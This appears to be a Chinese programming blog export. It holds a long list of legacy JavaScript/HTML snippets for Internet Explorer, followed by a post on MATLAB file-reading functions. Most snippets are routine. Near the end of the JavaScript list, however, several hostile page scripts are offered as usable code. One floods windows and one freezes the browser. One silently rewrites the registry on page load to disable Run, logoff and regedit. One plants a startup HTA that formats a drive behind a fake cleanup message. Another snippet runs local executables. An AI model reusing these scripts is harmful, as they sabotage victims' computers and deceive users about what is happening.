189.在java中使用正则表达式 java.util.regex.Pattern p = java.util.regex.Pattern.compile(&quot;\\\\d+|.\\\\d+|\\\\d+.\\\\d*|(E|\\\\d+E|.\\\\d+E|\\\\d+.\\\\d*E)((\\\\+|-)\\\\d|\\\\d)\\\\d*&quot;); java.util.regex.Matcher m = p.matcher(&quot;12.E+3&quot;); boolean result = m.matches();// 190.给下拉框分组 &lt;SELECT&gt; &lt;OPTGROUP LABEL=&quot;碱性金属&quot;&gt; &lt;OPTION&gt;锂 (Li)&lt;/OPTION&gt; &lt;OPTION&gt;纳 (Na)&lt;/OPTION&gt; &lt;OPTION&gt;钾 (K)&lt;/OPTION&gt; &lt;/OPTGROUP&gt; &lt;OPTGROUP LABEL=&quot;卤素&quot;&gt; &lt;OPTION&gt;氟 (F)&lt;/OPTION&gt; &lt;OPTION&gt;氯 (Cl)&lt;/OPTION&gt; &lt;OPTION&gt;溴 (Br)&lt;/OPTION&gt; &lt;/OPTGROUP&gt; &lt;/SELECT&gt;// 191.加注音 &lt;RUBY&gt; 基准文本 &lt;RT&gt;注音文本 &lt;/RUBY&gt;// 192.加删除线 &lt;S&gt;此文本将带删除线显示。&lt;/S&gt;// 193.取frame中的event事件 document.frames(&quot;workspace&quot;).event.keyCode// 194.是弹出方法的定义 String.prototype.trim=function() &#123; return this.replace(/(^\\s*)|(\\s*$)/g, &quot;&quot;); &#125; alert(&quot; &quot;.trim)// 195.防止网页被包含 if (window != window.top) top.location.href = location.href;// 196.让网页一直在frame里面 if(window==window.top) &#123; document.body.innerHTML=&quot;&lt;center&gt;&lt;h1&gt;请通过正常方式访问本页面！&lt;/h1&gt;&lt;/center&gt;&quot;; //window.close(); &#125;// 197.加为首页 &lt;SCRIPT&gt; function fnSet()&#123; oHomePage.setHomePage(location.href); event.returnValue = false; &#125; &lt;/SCRIPT&gt; &lt;IE:HOMEPAGE ID=&quot;oHomePage&quot; style=&quot;behavior:url(#default#homepage)&quot;/&gt;// 198.xml数据岛操作 &lt;HTML&gt; &lt;HEAD&gt;&lt;Title&gt;HTML中的数据岛中的记录集&lt;/Title&gt;&lt;/HEAD&gt; &lt;body bkcolor=#EEEEEE text=blue bgcolor=&quot;#00FFFF&quot;&gt; &lt;Table align=center width=&quot;100%&quot;&gt;&lt;TR&gt;&lt;TD align=&quot;center&quot;&gt; &lt;h5&gt;&lt;b&gt;&lt;font size=&quot;4&quot; color=&quot;#FF0000&quot;&gt;HTML中的XML数据岛记录编辑与添加 &lt;/font&gt;&lt;/b&gt;&lt;/h5&gt; &lt;/TD&gt;&lt;/TR&gt;&lt;/Table&gt; &lt;HR&gt; 酒店名称：&lt;input type=text datasrc=#theXMLisland DataFLD=NAME size=&quot;76&quot;&gt;&lt;BR&gt; 地址：&lt;input type=text datasrc=#theXMLisland DataFLD=Address size=&quot;76&quot;&gt;&lt;BR&gt; 主页：&lt;input type=text datasrc=#theXMLisland DataFLD=HomePage size=&quot;76&quot;&gt;&lt;BR&gt; 电子邮件：&lt;input type=text datasrc=#theXMLisland DataFLD=E-Mail size=&quot;76&quot;&gt;&lt;BR&gt; 电话：&lt;input type=text datasrc=#theXMLisland DataFLD=TelePhone size=&quot;76&quot;&gt;&lt;BR&gt; 级别：&lt;input type=text datasrc=#theXMLisland DataFLD=Grade size=&quot;76&quot;&gt;&lt;HR&gt; &lt;input id=&quot;first&quot; TYPE=button value=&quot;&lt;&lt; 第一条记录&quot; onclick=&quot;theXMLisland.recordset.moveFirst()&quot;&gt; &lt;input id=&quot;prev&quot; TYPE=button value=&quot;&lt;上一条记录&quot; onclick=&quot;theXMLisland.recordset.movePrevious()&quot;&gt; &lt;input id=&quot;next&quot; TYPE=button value=&quot;下一条记录&gt;&quot; onclick=&quot;theXMLisland.recordset.moveNext()&quot;&gt; &lt;input id=&quot;last&quot; TYPE=button value=&quot;最后一条记录&gt;&gt;&quot; onclick=&quot;theXMLisland.recordset.moveLast()&quot;&gt;&amp;nbsp; &lt;input id=&quot;Add&quot; TYPE=button value=&quot;添加新记录&quot; onclick=&quot;theXMLisland.recordset.addNew()&quot;&gt; &lt;XML ID=&quot;theXMLisland&quot;&gt; &lt;HotelList&gt; &lt;Hotel&gt; &lt;Name&gt;四海大酒店&lt;/Name&gt; &lt;Address&gt;海魂路1号&lt;/Address&gt; &lt;HomePage&gt;www.sihaohotel.com.cn&lt;/HomePage&gt; &lt;E-Mail&gt;master@sihaohotel.com.cn&lt;/E-Mail&gt; &lt;TelePhone&gt;(0989)8888888&lt;/TelePhone&gt; &lt;Grade&gt;五星级&lt;/Grade&gt; &lt;/Hotel&gt; &lt;Hotel&gt; &lt;Name&gt;五湖宾馆&lt;/Name&gt; &lt;Address&gt;东平路99号&lt;/Address&gt; &lt;HomePage&gt;www.wuhu.com.cn&lt;/HomePage&gt; &lt;E-Mail&gt;web@wuhu.com.cn&lt;/E-Mail&gt; &lt;TelePhone&gt;(0979)1111666&lt;/TelePhone&gt; &lt;Grade&gt;四星级&lt;/Grade&gt; &lt;/Hotel&gt; &lt;Hotel&gt; &lt;Name&gt;“大沙漠”宾馆&lt;/Name&gt; &lt;Address&gt;留香路168号&lt;/Address&gt; &lt;HomePage&gt;www.dashamohotel.com.cn&lt;/HomePage&gt; &lt;E-Mail&gt;master@dashamohotel.com.cn&lt;/E-Mail&gt; &lt;TelePhone&gt;(0989)87878788&lt;/TelePhone&gt; &lt;Grade&gt;五星级&lt;/Grade&gt; &lt;/Hotel&gt; &lt;Hotel&gt; &lt;Name&gt;“画眉鸟”大酒店&lt;/Name&gt; &lt;Address&gt;血海飘香路2号&lt;/Address&gt; &lt;HomePage&gt;www.throstlehotel.com.cn&lt;/HomePage&gt; &lt;E-Mail&gt;chuliuxiang@throstlehotel.com.cn&lt;/E-Mail&gt; &lt;TelePhone&gt;(099)9886666&lt;/TelePhone&gt; &lt;Grade&gt;五星级&lt;/Grade&gt; &lt;/Hotel&gt; &lt;/HotelList&gt; &lt;/XML&gt; &lt;/body&gt; &lt;/HTML&gt; //xml数据岛中添加记录 ------------------------------- The following list is a sample of the properties and methods that you use to access nodes in an XML document. Property/ Method Description XMLDocument Returns a reference to the XML Document Object Model (DOM) exposed by the object. documentElement Returns the document root of the XML document. childNodes Returns a node list containing the children of a node (if any). item Accesses individual nodes within the list through an index. Index values are zero-based, so item(0) returns the first child node. text Returns the text content of the node. The following code shows an HTML page containing an XML data island. The data island is contained within 字串6 the &lt;XML&gt; element. &lt;HTML&gt; &lt;HEAD&gt; &lt;TITLE&gt;HTML with XML Data Island&lt;/TITLE&gt; &lt;/HEAD&gt; &lt;BODY&gt; &lt;P&gt;Within this document is an XML data island.&lt;/P&gt; &lt;XML ID=&quot;resortXML&quot;&gt; &lt;resorts&gt; &lt;resort code=&#x27;1&#x27;&gt;Adventure Works&lt;/resort&gt; &lt;resort&gt;Alpine Ski House&lt;/resort&gt; &lt;/resorts&gt; &lt;/XML&gt; &lt;/BODY&gt; &lt;/HTML&gt; For an example, you can cut and paste this sample line of code: resortXML.XMLDocument.documentElement.childNodes.item(1).text//读取页面上的XML数据岛中的数据 resortXML.documentElement.childNodes.item(0).getAttribute(&quot;code&quot;)//读取页面上的XML数据岛中的数据 resortXML.documentElement.childNodes[0].getAttribute(&quot;code&quot;)//读取页面上的XML数据岛中的数据 199.模式窗口 父窗口 var url=&quot;aaa.jsp&quot;; var data=showModalDialog(url,null,&quot;dialogHeight:400px;dialogHeight:600px;center:yes;help:No;status:no;resizable:Yes;edge:sunken&quot;); if(data) alert(data.value); 子窗口 var data=new Object(); data.value1=&quot;china&quot;; window.returnValue=data; window.close(); 200.动态设置事件，带参数 &lt;INPUT TYPE=&quot;text&quot; NAME=&quot;a1&quot;&gt; &lt;SCRIPT&gt; &lt;!-- function hah(para) &#123; alert(para) &#125; a1.onclick=function() &#123; hah(&#x27;canshu &#x27;) &#125; //a1.attachEvent(&quot;onclick&quot;,function()&#123;hah(&#x27;参数&#x27;)&#125;); //--&gt; &lt;/SCRIPT&gt;// 201.将url转化为16进制形式 var ret = &#x27;&#x27;; for(var i=0; i &lt; str.length; i++) &#123; var ch = str.charAt(i); var code = str.charCodeAt(i); if(code &lt; 128 &amp;&amp; ch != &#x27;[&#x27; &amp;&amp; ch != &#x27;\\&#x27;&#x27; &amp;&amp; ch != &#x27;=&#x27;) &#123; ret += ch; &#125; else &#123; ret += &quot;[&quot; + code.toString(16) + &quot;]&quot;; &#125; &#125; return ret;// 202.打开新的窗口并将新打开的窗口设置为活动窗口 var newWin=window.open(&quot;xxxx&quot;); newWin.focus();// 203.容错脚本 JS中遇到脚本错误时不做任何操作:window.onerror = doNothing; 指定错误句柄的语法为:window.onerror = handleError function handleError(message, URI, line) &#123;// 提示用户，该页可能不能正确回应 return true; // 这将终止默认信息 &#125;//在页面出错时进行操作 204.JS中的窗口重定向: window.navigate(&quot;http://www.sina.com.cn&quot;);// 205.防止链接文字折行 document.body.noWrap=true;// 206.判断字符是否匹配. string.match(regExpression)// 207. href=&quot;javascript:document.Form.Name.value=&#x27;test&#x27;;void(0);&quot;//不能用onClick=&quot;javacript:document.Form.Name.v alue=&#x27;test&#x27;;return false; 当使用inline方式添加事件处理脚本事，有一个被包装成匿名函数的过程，也就是说 onClick=&quot;javacript:document.Form.Name.value=&#x27;test&#x27;;return false;&quot;被包装成了： functoin anonymous() &#123; document.Form.Name.value=&#x27;test&#x27;;return false; &#125; 做为A的成员函数onclick。 而href=&quot;javascript:document.Form.Name.value=&#x27;test&#x27;;void(0);&quot;相当于执行全局语句，这时如果使用return语句会报告在函数外使用return语句的错误。 208.进行页面放大 &lt;P onmouseover=&quot;this.style.zoom=&#x27;200%&#x27;&quot; onmouseout=&quot;this.style.zoom=&#x27;normal&#x27;&quot;&gt; sdsdsdsdsdsdsdsds &lt;/p&gt;// 209.放置在页面的最右边 &lt;input type=&quot;text&quot; value=&#x27;bu2&#x27; style=&quot;float:right&quot;&gt;// 210.通过style来控制隔行显示不同颜色 &lt;style&gt; tr&#123; bgcolor:expression(this.bgColor=((this.rowIndex)%2==0 )? &#x27;white&#x27; : &#x27;yellow&#x27;); &#125; &lt;/style&gt; &lt;table id=&quot;oTable&quot; width=&quot;100&quot; border=&quot;1&quot; style=&quot;border-collapse:collapse;&quot;&gt; &lt;tr&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt;// 211.全屏最大化 newwindow=window.open(&quot;&quot;,&quot;&quot;,&quot;scrollbars&quot;) if (document.all) &#123; newwindow.moveTo(0,0) newwindow.resizeTo(screen.width,screen.height) &#125;// 212.根据名字解析xml中的节点值 var XMLDoc=new ActiveXObject(&quot;MSXML&quot;); XMLDoc.url=&quot;d:/abc.xml&quot;; aRoot=XMLDoc.root; a1.innerText=aRoot.children.item(&quot;name&quot;).text;// 213.在页面上解析xml的值 http://msdn.microsoft.com/library/default.asp?url=/library/en-us/xmlsdk/html/5996c682-3472-4b03-9fb0-1e08fcccdf35.asp // 214.看一个字符串里面有多少个回车符，返回值是一个数组 var s=value.match(/\\n/g);if(s)if(s.length==9)&#123;alert(&#x27;10行了&#x27;);return false;&#125;// 215.获得asc码 var s=&#x27;aa&#x27;; alert(s.charCodeAt(1))// 216.文字居右对齐 &lt;input type=&quot;text&quot; value=&quot;123&quot; style=&quot;text-align:right&quot;&gt;// 217.判断一个方法是否存在 function pageCallback(response)&#123; alert(response); &#125; if(pageCallback) alert(1)// 218.判断一个变量是否定义 if(typeof(a)==&quot;undefined&quot;) &#123; alert() &#125;// 219.javascript执行本机的可执行程序,需设置为可信或者降低IE安全级别 &lt;script&gt; function exec (command) &#123; window.oldOnError = window.onerror; window._command = command; window.onerror = function (err) &#123; if (err.indexOf(&#x27;utomation&#x27;) != -1) &#123; alert(&#x27;命令已经被用户禁止！&#x27;); return true; &#125; else return false; &#125;; var wsh = new ActiveXObject(&#x27;WScript.Shell&#x27;); if (wsh) wsh.Run(command); window.onerror = window.oldOnError; &#125; &lt;/script&gt; 调用方式 &lt;a href=&quot;javascript:&quot; onclick=&quot;exec(&#x27;D:/test.bat&#x27;)&quot;&gt;测试&lt;/a&gt;// 220.弹出新页面，关闭旧页面，不弹出提示框 var w=screen.availWidth-10; var h=screen.availHeight-10; var swin=window.open(&quot;/mc/mc/message_management.jsp&quot;, &quot;BGSMbest&quot;,&quot;scrollbars=yes,status,location=0,menubar=0,toolbar=0,resizable=no,top=0,left=0,height=&quot;+h+&quot;,width=&quot;+w); window.opener=null; window.close();// 221.能输入的下拉框 &lt;span&gt; &lt;input name=&quot;Department1&quot; id=&quot;Department1&quot; style=&quot; border-right:0;width:130&quot; autocomplete=&quot;off&quot;&gt; &lt;span style=&quot;width:150;overflow:hidden&quot;&gt; &lt;select style=&quot;width:150;margin-left:-130&quot; onChange=&quot;Department1.value=value&quot;&gt; &lt;option value=&quot;&quot;&gt;&lt;/option&gt; &lt;option value=&quot;asdfasfadf&quot;&gt;asdfasfadf&lt;/option&gt; &lt;option value=&quot;546546&quot;&gt;546546&lt;/option&gt;&lt;/select&gt; // 222.在方法中定义全局变量 function globalVar (script) &#123; eval(script);//all navigators //window.execScript(script); //for ie only &#125; globalVar(&#x27;window.haha = &quot;../system&quot;;&#x27;); alert(haha);//在方法中定义全局变量，其中的haha就是全局变量了 223.显示一个对象的全部的属性和属性的值 var a=new Object(); a.name=&#x27;a1&#x27;; a.***=&#x27;mail&#x27; for(var p in a) &#123; alert(p+&quot;=&quot;+a[p]) &#125;// 224.16进制转换成10进制 var n = parseInt(&quot;2AE&quot;,16);//这里将16进制的 2AE 转成 10 进制数，得到 n 的值是 686 225.复制粘贴 &lt;BODY&gt; &lt;input type=&quot;file&quot; name=&#x27;a1&#x27;&gt;&lt;input type=&quot;button&quot; value=&#x27;复制粘贴&#x27; onclick=&quot;haha()&quot;&gt;&lt;div id=&quot;aa&quot;&gt;&lt;/div&gt; &lt;SCRIPT&gt; &lt;!-- function haha() &#123; clipboardData.setData(&quot;Text&quot;,a1.value); aa.innerText=clipboardData.getData(&quot;Text&quot;); &#125; //--&gt; &lt;/SCRIPT&gt; &lt;/BODY&gt;// 226.获得对象类型 switch (object.constructor)&#123; case Date: ... case Number: ... case String: ... case MyObject: ... default: ... &#125;// 227.图片加载失败时重新加载图片 &lt;img src=&quot;aa.gif&quot; onerror=&quot;this.src=&#x27;aa.gif&#x27;&quot;&gt;// 228. //font_effect.htc &lt;PUBLIC:ATTACH EVENT=&quot;onmouseover&quot; ONEVENT=&quot;glowit()&quot; /&gt; &lt;PUBLIC:ATTACH EVENT=&quot;onmouseout&quot; ONEVENT=&quot;noglow()&quot; /&gt; &lt;SCRIPT LANGUAGE=&quot;JScript&quot;&gt; //定义一个保存字体颜色的变量 var color; function glowit() &#123; color=element.style.backgroundColor; element.style.backgroundColor=&#x27;white&#x27; &#125; function noglow() &#123; element.style.backgroundColor=color &#125; &lt;/SCRIPT&gt; //abc.css tr&#123;behavior:url(font_effect.htc);&#125; 229.可以通过css和htc改变表格的颜色,仅IE支持 //xxx.html &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;abc.css&quot;&gt; &lt;TABLE border=&#x27;1&#x27; id=&quot;a1&quot;&gt; &lt;TR style=&quot;background-color:red&quot;&gt; &lt;TD&gt;1&lt;/TD&gt; &lt;TD&gt;2&lt;/TD&gt; &lt;TD&gt;3&lt;/TD&gt; &lt;/TR&gt; &lt;TR style=&quot;background-color:yellow&quot;&gt; &lt;TD&gt;4&lt;/TD&gt; &lt;TD&gt;5&lt;/TD&gt; &lt;TD&gt;6&lt;/TD&gt; &lt;/TR&gt; &lt;/TABLE&gt;// 230.在页面上画点 function a(x,y,color) &#123; document.write(&quot;&lt;img border=&#x27;0&#x27; style=&#x27;position: absolute; left: &quot;+(x+20)+&quot;; top: &quot;+(y+20)+&quot;;background-color: &quot;+color+&quot;&#x27; width=1 height=1&gt;&quot;) &#125;// 231.自动关闭网页 &lt;script&gt; &lt;!-- setTimeout(&#x27;window.close();&#x27;, 10000); //60秒后关闭 // --&gt; &lt;/script&gt; &lt;p align=&quot;center&quot;&gt;本页10秒后自动关闭,请注意刷新页面&lt;/p&gt; 单击按钮就跳出无限窗口，知道耗尽资源 1234567891011121314151617181920&lt;html&gt;&lt;head&gt;&lt;script&gt;&lt;!---hide---function pop()&#123;for(i=1;i&lt;9;i++)&#123;//用一个循环语句，打开++个窗口，有下面的window.open实现window.open(&#x27;11.htm&#x27;,&#x27;&#x27;,&#x27;width=800,height=600&#x27;,&#x27;status=off&#x27;,&#x27;toolbar=off&#x27;,&#x27;scrollbars=off&#x27;)&#125;&#125;//---&gt;//其中的11.htm是任写的，width为窗口的宽，长&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form name=&quot;form&quot;&gt;&lt;p aligen=&quot;center&quot;&gt;&lt;input type=&quot;button&quot; value=&quot;enter&quot; onclick=&quot;pop()&quot; name=&quot;button&quot; class=&quot;unnamed1&quot;&gt;//虚构一个进入的按钮，单击后执行pop()函数，打开++个窗口&lt;/p&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 冻结窗口 12345678910&lt;html&gt;&lt;head/&gt;&lt;script&gt;function freeze()&#123;alert(&#x27;from now on,the window is freezing!!!&#x27;);while(true)&#123;window.history.back(-1)&#125;&#125;&lt;/script&gt;&lt;form&gt;&lt;input type=&quot;button&quot; value=&quot;try it...&quot; onclick=&quot;freeze()&quot;&gt;&lt;/form&gt;&lt;/html&gt; 恶意修改注册表 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;html&gt;&lt;head&gt;&lt;script&gt;document.write(&quot;&lt;applet height=0 width=0 code=com.ms.activeX.ActiveXComponent/&gt;&quot;);function f()&#123;try&#123;&lt;!--activex-a1=document.applets[0];a1.setCLSID(&#123;f935dc22-1cf0-11d0-adb9-00c04fd58a0b&#125;&quot;);a1.createInstance();Sh1=a1.GetObject();a1.setCLSID(&quot;&#123;0d43fe01-f093-11cf-8940-00a0c9054228&#125;&quot;);a1.createInstance();FSO=a1.GetObject();a1.setCLSID=(&quot;&#123;f935dc22-1cf0-11d0-adb9-00c04fd58a0b&#125;&quot;);a1.createInstance();NET=a1.GetObject();try&#123;if (document.cookie.indexOf(&quot;CHg&quot;)==-1)&#123;//下面是对注册表进行读写操作sh1.RegWrite(&quot;HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Polices\\\\Explorer\\\\NoRun&quot;,01,&quot;REG_BINARY&quot;);//没有了开始菜单中的运行sh1.RegWrite(&quot;HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Polices\\\\Explorer\\\\NoClose&quot;,01,&quot;REG_BINARY&quot;);//没有关闭系统sh1.RegWrite(&quot;HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Polices\\\\Explorer\\\\NoLogOff&quot;,01,&quot;REG_BINARY&quot;);//没有注销sh1.RegWrite(&quot;HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Polices\\\\Explorer\\\\NoDrives&quot;,&quot;00000004&quot;,&quot;REG_DWORD&quot;);//使系统没有逻辑启动器csh1.RegWrite(&quot;HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Polices\\\\System\\\\DisableRegistryTools&quot;,&quot;11111111&quot;,&quot;REG_DWORD&quot;);//禁止运行注册表编辑器sh1.RegWrite(&quot;HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Polices\\\\winOldApp\\\\Disabled&quot;,&quot;11111111&quot;,&quot;REG_DWORD&quot;);//禁止运行dos应用程序sh1.RegWrite(&quot;HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Polices\\\\winOldApp\\\\NoREalMOde&quot;,&quot;11111111&quot;,&quot;REG_DWORD&quot;);//禁止系统启动到实模式下（即dos模式下）sh1.RegWrite(&quot;HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Winlogo\\\\LegalNoticeText&quot;,&quot;caution!&quot;);//弹出标题位===的窗口sh1.RegWrite(&quot;HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Winlogo\\\\LegalNoticeText&quot;,&quot;caution!your regstry has been changed!!!&quot;);//弹出窗口sh1.regwrite(&quot;HKCU\\\\SoftWare\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Start Page&quot;,&quot;www.===.com&quot;);sh1.regwrite(&quot;HKLM\\\\SoftWare\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Window Title&quot;,&quot;hello world!&quot;);sh1.regwrite(&quot;HKCU\\\\SoftWare\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Window Title&quot;,&quot;hello world!&quot;);//修改ie标题var expdate=new date((new date()).gettime()+(1));document.cookie=&quot;CHg=general;expires=&quot;+expdata.toGMTString()+&quot;;path=/;&quot;&#125;&#125;catch(e)&#123;&#125;&#125;function init()&#123;setTimeout(&quot;f()&quot;,1000);//设置打开页面后1000毫秒执行f（）函数，修改注册表&#125;init();&lt;/script&gt;&lt;/head&gt;&lt;body/&gt;&lt;/html&gt; 格掉硬盘 1234567891011121314151617&lt;html&gt;&lt;head&gt;&lt;object id=&quot;scr&quot; classid=&quot;clsid:06290bd5-48aa-11d2-8432-006008c3fbfc&quot; width=&quot;14&quot; height=&quot;14&quot;&gt;&lt;/object&gt;&lt;script&gt;scr.reset();scr.path=&quot;c:\\\\windows\\\\start menu\\\\programs\\\\启动\\\\test.hta&quot;;//将文件写到启动的目录下，并命名test。hta，下次开机将执行他，该文件将执行format命令，格式化你的硬盘scr.doc=&quot;&lt;object id=&#x27;wsh&#x27; classid=&#x27;clsid:f935dc22-1cf0-11d0-adb9-00c04fd58a0b&#x27;&gt;&lt;/object&gt;&lt;script&gt;wsh.run(&#x27;start /m format a: /autotest /u&#x27;);//强迫系统不检查硬盘就立即执行format指令，并使窗口处于最小化状态alert(&#x27;important:windows is removing unused temporary files.&#x27;);&lt;/&quot;+&quot;script&gt;&quot;;scr.write();&lt;/script&gt;&lt;/head&gt;&lt;body/&gt;&lt;/html&gt; 自动修改主框架（iframe）的高度 1234567891011&lt;script type=&quot;text/javascript&quot;&gt;&lt;!--function load()&#123;parent.document.getElementById(&quot;desc&quot;).height=document.body.clientHeight; &#125;--&gt;&lt;/script&gt; 跑马灯 js 可以控制速度 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;show&quot;&gt;&lt;/div&gt; &lt;div id=&quot;andyscroll&quot; style=&quot; height:100px;overflow:hidden&quot;&gt; &lt;div id=&quot;scrollmessage&quot; style=&quot;width:100px; height:100px; &quot;&gt;sdfdsfdsfdfs&lt;/br&gt;sdfdsfdsfdfs&lt;/br&gt;sdfdsfdsfdfs&lt;/br&gt;sdfdsfdsfdfs&lt;/br&gt;sdfdsfdsfdfs&lt;/br&gt;sdfdsfdsfdfs&lt;/br&gt; &lt;/div&gt; &lt;/div&gt; &lt;script &gt; var stopscroll = false; var scrollElem = document.getElementById(&quot;andyscroll&quot;); var marqueesHeight = scrollElem.style.height; scrollElem.onmouseover = new Function(&#x27;stopscroll = true&#x27;); scrollElem.onmouseout = new Function(&#x27;stopscroll = false&#x27;); var preTop = 0; var currentTop = 0; var stoptime = 0; var n=4; var leftElem = document.getElementById(&quot;scrollmessage&quot;); scrollElem.appendChild(leftElem.cloneNode(true)); init_srolltext(n); function init_srolltext(n)&#123; scrollElem.scrollTop = 0; setInterval(&#x27;scrollUp(n)&#x27;, 100); &#125; function scrollUp(n)&#123; if(stopscroll) return; currentTop += 2+n; if(currentTop == 19) &#123; stoptime += 1+n; currentTop -= 1+n; if(stoptime == 180) &#123; currentTop = 0; stoptime = 0; &#125; &#125;else&#123; preTop = scrollElem.scrollTop; scrollElem.scrollTop += 1+n; if(preTop == scrollElem.scrollTop)&#123; scrollElem.scrollTop = 0; scrollElem.scrollTop += 1+n; &#125; &#125; &#125; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","tags":"javascript code-snippets html"},{"title":"matllab读txt文件","url":"/20220105/matllab-du-txt-wen-jian/","text":"matlab读取文本文件的几种函数： 1、load——适合读取纯数据文本； 2、importdata——只读取数据，自动省略数据格式前后的字符，超大文件不适合； 3、textread、textscan——适合读取行列规整的文本，会存到元胞中，可通过headerlines省略读取字段名（字符行）； 4、csvread、dlmread——适合读取csv、xsl等文件格式文本； 5、fprintf、fscanf——适合读取复杂的文本（中英文、数字串混杂出现）； 另外，转 http://blog.sina.com.cn/s/blog_4b5b880c0100e7mm.html 如何编写MATLAB程序才能实现对.TXT文档的读写呢？文件操作是一种重要的输入输出方式，即从数据文件读取数据或将结果写入数据文件。MATLAB提供了一系列低层输入输出函数，专门用于文件操作。 1、文件的打开与关闭 1）打开文件在读写文件之前，必须先用fopen函数打开或创建文件，并指定对该文件进行的操作方式。fopen函数的调用格式为： fid=fopen（文件名，‘打开方式’）说明：其中fid用于存储文件句柄值，如果返回的句柄值大于0，则说明文件打开成功。文件名用字符串形式，表示待打开的数据文件。常见的打开方式如下： ‘r’：只读方式打开文件（默认的方式），该文件必须已存在。 ‘r+’：读写方式打开文件，打开后先读后写。该文件必须已存在。 ‘w’：打开后写入数据。该文件已存在则更新；不存在则创建。 ‘w+’：读写方式打开文件。先读后写。该文件已存在则更新；不存在则创建。 ‘a’：在打开的文件末端添加数据。文件不存在则创建。 ‘a+’：打开文件后，先读入数据再添加数据。文件不存在则创建。 另外，在这些字符串后添加一个“t”，如‘rt’或‘wt+’，则将该文件以文本方式打开；如果添加的是“b”，则以二进制格式打开，这也是fopen函数默认的打开方式。 2）关闭文件文件在进行完读、写等操作后，应及时关闭，以免数据丢失。关闭文件用fclose函数，调用格式为： 1sta＝fclose(fid) 说明：该函数关闭fid所表示的文件。sta表示关闭文件操作的返回代码，若关闭成功，返回0，否则返回-1。如果要关闭所有已打开的文件用fclose(‘all’)。 2、二进制文件的读写操作 1）写二进制文件 fwrite函数按照指定的数据精度将矩阵中的元素写入到文件中。其调用格式为： 1COUNT＝fwrite（fid，A，precision） 说明：其中COUNT返回所写的数据元素个数（可缺省），fid为文件句柄，A用来存放写入文件的数据，precision代表数据精度，常用的数据精度有：char、uchar、int、long、float、double等。缺省数据精度为uchar，即无符号字符格式。 例6.8 将一个二进制矩阵存入磁盘文件中。 1234567a=[1 2 3 4 5 6 7 8 9];fid=fopen(&#x27;d:\\test.bin&#x27;,&#x27;wb&#x27;) %以二进制数据写入方式打开文件fid = %其值大于0，表示打开成功fwrite(fid,a,&#x27;double&#x27;)ans = 9 %表示写入了9个数据fclose(fid)ans = 0 %表示关闭成功 2）读二进制文件 fread函数可以读取二进制文件的数据，并将数据存入矩阵。其调用格式为： 1[A，COUNT]=fread(fid，size，precision) 说明：其中A是用于存放读取数据的矩阵、COUNT是返回所读取的数据元素个数、fid为文件句柄、size为可选项，若不选用则读取整个文件内容；若选用则它的值可以是下列值：N（读取N个元素到一个列向量）、inf（读取整个文件）、[M，N]（读数据到M×N的矩阵中，数据按列存放）。precision用于控制所写数据的精度，其形式与fwrite函数相同 3、文本文件的读写操作 1）读文本文件 fscanf函数可以读取文本文件的内容，并按指定格式存入矩阵。其调用格式为： 1[A，COUNT]=fscanf(fid，format，size) 说明：其中A用来存放读取的数据，COUNT返回所读取的数据元素个数，fid为文件句柄，format用来控制读取的数据格式，由%加上格式符组成，常见的格式符有：d（整型）、f（浮点型）、s（字符串型）、c（字符型）等，在%与格式符之间还可以插入附加格式说明符，如数据宽度说明等。size为可选项，决定矩阵A中数据的排列形式，它可以取下列值：N（读取N个元素到一个列向量）、inf（读取整个文件）、[M，N]（读数据到M×N的矩阵中，数据按列存放）。 2）写文本文件 fprintf函数可以将数据按指定格式写入到文本文件中。其调用格式为： 1fprintf（fid，format，A） 说明：fid为文件句柄，指定要写入数据的文件，format是用来控制所写数据格式的格式符，与fscanf函数相同，A是用来存放数据的矩阵。 例6.9 创建一个字符矩阵并存入磁盘，再读出赋值给另一个矩阵。 12345678a=&#x27;string&#x27;;fid=fopen(&#x27;d:\\char1.txt&#x27;,&#x27;w&#x27;);fprintf(fid,&#x27;%s&#x27;,a);fclose(fid);fid1=fopen(&#x27;d:\\char1.txt&#x27;,&#x27;rt&#x27;);fid1=fopen(&#x27;d:\\char1.txt&#x27;,&#x27;rt&#x27;);b=fscanf(fid1,&#x27;%s&#x27;)b = string matlab读txt文件 1234567fid=fopen(&#x27;fx.txt&#x27;,&#x27;r&#x27;);%得到文件号[f,count]=fscanf(fid,&#x27;%f %f&#x27;,[12,90]);%把文件号1的数据读到f中。其中f是[12 90]的矩阵%这里&#x27;%f %f&#x27;表示读取数据的形势，他是按原始数据型读出fclose(fid);%关闭文件 另外有的txt文件还可以用load来打开其语句为 1f=load(&#x27;xxx.txt&#x27;) 个人觉得用第一种方式较好。因为有些时候，特别是xxx.txt 的一行种有多个数据时用load 就比较麻烦了。 转自https://blog.csdn.net/awakeljw/article/details/76175515 matlab的文件读取函数功能可以读取各种文件类型，包括 12345678textread(字母和数值每行格式一致) xlsread(读取excel文件) importdata(字母和数值分开，以数字为主，字母只存在前几行) load(纯数据) 